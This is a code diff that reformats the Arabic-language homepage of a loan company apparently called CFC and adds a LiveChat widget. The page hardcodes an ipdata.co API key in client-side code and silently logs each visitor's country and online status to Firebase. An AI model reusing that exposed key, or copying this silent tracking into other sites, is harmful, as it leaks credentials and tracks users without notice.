@@ -1,41 +1,57 @@
-"use client"
+"use client";
 
-import { Button } from "@/components/ui/button"
-import { Card, CardContent } from "@/components/ui/card"
-import { Menu, Users, Car, HandCoins, Phone, Mail, MapPin, Download, Star, Shield, Clock, Award } from "lucide-react"
-import HeroCarousel from "@/components/hero-carousel"
-import Link from "next/link"
-import { useEffect } from "react"
-import { addData } from "@/lib/firebase"
-import { setupOnlineStatus } from "@/lib/utils"
-function randstr(prefix:string)
-{
-    return Math.random().toString(36).replace('0.',prefix || '');
+import { Button } from "@/components/ui/button";
+import { Card, CardContent } from "@/components/ui/card";
+import {
+  Menu,
+  Users,
+  Car,
+  HandCoins,
+  Phone,
+  Mail,
+  MapPin,
+  Download,
+  Star,
+  Shield,
+  Clock,
+  Award,
+} from "lucide-react";
+import HeroCarousel from "@/components/hero-carousel";
+import Link from "next/link";
+import { useEffect } from "react";
+import { addData } from "@/lib/firebase";
+import { setupOnlineStatus } from "@/lib/utils";
+import { LiveChatWidget } from "@livechat/widget-react";
+
+function randstr(prefix: string) {
+  return Math.random()
+    .toString(36)
+    .replace("0.", prefix || "");
 }
-const visitorID=randstr('Tmn-')
+const visitorID = randstr("Tmn-");
 export default function CFCHomePage() {
   useEffect(() => {
-    getLocation()
-  }, [])
+    getLocation();
+  }, []);
   async function getLocation() {
-    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
     const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
-  
+
     try {
-        const response = await fetch(url);
-        if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-        const country = await response.text();
-        addData({
-            id:visitorID,
-            country: country,
-            createdDate: new Date().toISOString()
-        })
-        localStorage.setItem('country',country)
-        setupOnlineStatus(visitorID)
-      } catch (error) {
-        console.error('Error fetching location:', error);
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        id: visitorID,
+        country: country,
+        createdDate: new Date().toISOString(),
+      });
+      localStorage.setItem("country", country);
+      setupOnlineStatus(visitorID);
+    } catch (error) {
+      console.error("Error fetching location:", error);
     }
   }
   return (
@@ -45,10 +61,9 @@ export default function CFCHomePage() {
         <div className="flex items-center justify-between max-w-md mx-auto">
           <div className="flex items-center gap-3">
             <div className="w-10 h-10 rounded-full flex items-center justify-center shadow-md">
-            <img src="/next.svg" width={60}/>
+              <img src="/next.svg" width={60} />
             </div>
-            <div>
-            </div>
+            <div></div>
           </div>
           <Menu className="w-6 h-6" />
         </div>
@@ -59,7 +74,9 @@ export default function CFCHomePage() {
 
       {/* Calculate Your Loan */}
       <section className="p-6 max-w-md mx-auto">
-        <h2 className="text-xl font-bold text-gray-800 mb-6 text-center">احسب قرضك</h2>
+        <h2 className="text-xl font-bold text-gray-800 mb-6 text-center">
+          احسب قرضك
+        </h2>
         <div className="grid grid-cols-2 gap-4">
           <Link href="/loan-application">
             <Card className="group hover:shadow-xl transition-all duration-300 hover:-translate-y-1 border-0 shadow-md cursor-pointer">
@@ -83,7 +100,9 @@ export default function CFCHomePage() {
                 </div>
                 <div>
                   <p className="font-semibold text-gray-800">قرض سيارة</p>
-                  <p className="text-xs text-gray-500 mt-1">احصل على سيارة أحلامك</p>
+                  <p className="text-xs text-gray-500 mt-1">
+                    احصل على سيارة أحلامك
+                  </p>
                 </div>
               </CardContent>
             </Card>
@@ -95,14 +114,17 @@ export default function CFCHomePage() {
       <section className="p-6 max-w-md mx-auto">
         <h2 className="text-xl font-bold text-gray-800 mb-4">لماذا CFC؟</h2>
         <p className="text-sm text-gray-600 mb-6 leading-relaxed">
-          مرحباً بكم في CFC، حيث رضاكم هو أولويتنا. اكتشفوا لماذا يعتبر اختيار CFC هو أفضل قرار لاحتياجاتكم المالية.
+          مرحباً بكم في CFC، حيث رضاكم هو أولويتنا. اكتشفوا لماذا يعتبر اختيار
+          CFC هو أفضل قرار لاحتياجاتكم المالية.
         </p>
 
         <div className="grid grid-cols-2 gap-3 mb-6">
           <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100">
             <div className="flex items-center gap-2 mb-2">
               <Shield className="w-5 h-5 text-blue-600" />
-              <span className="text-sm font-semibold text-gray-800">أمان وثقة</span>
+              <span className="text-sm font-semibold text-gray-800">
+                أمان وثقة
+              </span>
             </div>
             <p className="text-xs text-gray-600">حماية كاملة لبياناتكم</p>
           </div>
@@ -110,7 +132,9 @@ export default function CFCHomePage() {
           <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100">
             <div className="flex items-center gap-2 mb-2">
               <Clock className="w-5 h-5 text-green-600" />
-              <span className="text-sm font-semibold text-gray-800">سرعة في الخدمة</span>
+              <span className="text-sm font-semibold text-gray-800">
+                سرعة في الخدمة
+              </span>
             </div>
             <p className="text-xs text-gray-600">موافقة فورية</p>
           </div>
@@ -118,7 +142,9 @@ export default function CFCHomePage() {
           <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100">
             <div className="flex items-center gap-2 mb-2">
               <Star className="w-5 h-5 text-yellow-500" />
-              <span className="text-sm font-semibold text-gray-800">خدمة متميزة</span>
+              <span className="text-sm font-semibold text-gray-800">
+                خدمة متميزة
+              </span>
             </div>
             <p className="text-xs text-gray-600">دعم على مدار الساعة</p>
           </div>
@@ -126,13 +152,19 @@ export default function CFCHomePage() {
           <div className="bg-white p-4 rounded-xl shadow-sm border border-gray-100">
             <div className="flex items-center gap-2 mb-2">
               <Award className="w-5 h-5 text-purple-600" />
-              <span className="text-sm font-semibold text-gray-800">خبرة ٤٢ عاماً</span>
+              <span className="text-sm font-semibold text-gray-800">
+                خبرة ٤٢ عاماً
+              </span>
             </div>
             <p className="text-xs text-gray-600">ريادة في السوق</p>
           </div>
         </div>
 
-        <Button variant="outline" size="sm" className="mb-6 bg-white border-blue-200 text-blue-700 hover:bg-blue-50">
+        <Button
+          variant="outline"
+          size="sm"
+          className="mb-6 bg-white border-blue-200 text-blue-700 hover:bg-blue-50"
+        >
           اقرأ المزيد
         </Button>
 
@@ -146,7 +178,9 @@ export default function CFCHomePage() {
               <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto backdrop-blur-sm">
                 <div className="text-4xl font-bold">؟</div>
               </div>
-              <p className="text-sm opacity-90 mt-4">اكتشف المزايا التي تجعلنا الخيار الأول</p>
+              <p className="text-sm opacity-90 mt-4">
+                اكتشف المزايا التي تجعلنا الخيار الأول
+              </p>
             </div>
           </CardContent>
         </Card>
@@ -168,7 +202,9 @@ export default function CFCHomePage() {
               <div className="absolute top-0 right-0 w-16 h-16 bg-white/10 rounded-full -translate-y-8 translate-x-8"></div>
               <div className="relative z-10 space-y-3">
                 <div className="space-y-1">
-                  <p className="text-xs opacity-90 font-medium">تمويلك بدون كفيل</p>
+                  <p className="text-xs opacity-90 font-medium">
+                    تمويلك بدون كفيل
+                  </p>
                   <p className="text-xs opacity-80">بدون تحويل راتب</p>
                 </div>
                 <div className="text-center py-2">
@@ -203,13 +239,23 @@ export default function CFCHomePage() {
         </div>
 
         <div className="flex gap-2 flex-wrap">
-          <Button size="sm" className="bg-blue-600 hover:bg-blue-700 text-xs rounded-full px-4">
+          <Button
+            size="sm"
+            className="bg-blue-600 hover:bg-blue-700 text-xs rounded-full px-4"
+          >
             قرض سيارة
           </Button>
-          <Button size="sm" variant="outline" className="text-xs bg-white border-gray-200 rounded-full px-4">
+          <Button
+            size="sm"
+            variant="outline"
+            className="text-xs bg-white border-gray-200 rounded-full px-4"
+          >
             قرض نقدي
           </Button>
-          <Button size="sm" className="bg-blue-600 hover:bg-blue-700 text-xs rounded-full px-4">
+          <Button
+            size="sm"
+            className="bg-blue-600 hover:bg-blue-700 text-xs rounded-full px-4"
+          >
             قرض سكن
           </Button>
         </div>
@@ -225,11 +271,21 @@ export default function CFCHomePage() {
               من نحن
             </h3>
             <ul className="space-y-2 text-sm text-gray-600">
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">التاريخ</li>
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">الرؤية والرسالة</li>
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">مجلس الإدارة</li>
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">فريق الإدارة</li>
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">الحوكمة المؤسسية</li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                التاريخ
+              </li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                الرؤية والرسالة
+              </li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                مجلس الإدارة
+              </li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                فريق الإدارة
+              </li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                الحوكمة المؤسسية
+              </li>
             </ul>
           </div>
 
@@ -240,16 +296,27 @@ export default function CFCHomePage() {
               خدماتنا
             </h3>
             <div className="grid grid-cols-2 gap-2 text-sm text-gray-600">
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">قرض نقدي</li>
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">قرض سيارة</li>
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">قرض سكن</li>
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">قرض بحري</li>
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">قرض أثاث</li>
-              <li className="hover:text-blue-600 cursor-pointer transition-colors">قرض تجاري</li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                قرض نقدي
+              </li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                قرض سيارة
+              </li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                قرض سكن
+              </li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                قرض بحري
+              </li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                قرض أثاث
+              </li>
+              <li className="hover:text-blue-600 cursor-pointer transition-colors">
+                قرض تجاري
+              </li>
             </div>
           </div>
         </div>
-
 
         {/* Social Media & Apps */}
         <div className="flex justify-between items-center">
@@ -268,7 +335,9 @@ export default function CFCHomePage() {
           </div>
 
           <div>
-            <h4 className="font-semibold text-gray-800 mb-2 text-sm">حمل التطبيق</h4>
+            <h4 className="font-semibold text-gray-800 mb-2 text-sm">
+              حمل التطبيق
+            </h4>
             <div className="space-y-1">
               <div className="bg-black text-white px-3 py-1 rounded-lg flex items-center gap-2 text-xs cursor-pointer hover:bg-gray-800 transition-colors">
                 <Download className="w-3 h-3" />
@@ -291,6 +360,7 @@ export default function CFCHomePage() {
           </p>
         </div>
       </footer>
+      <LiveChatWidget license="19286514" />
     </div>
-  )
+  );
 }
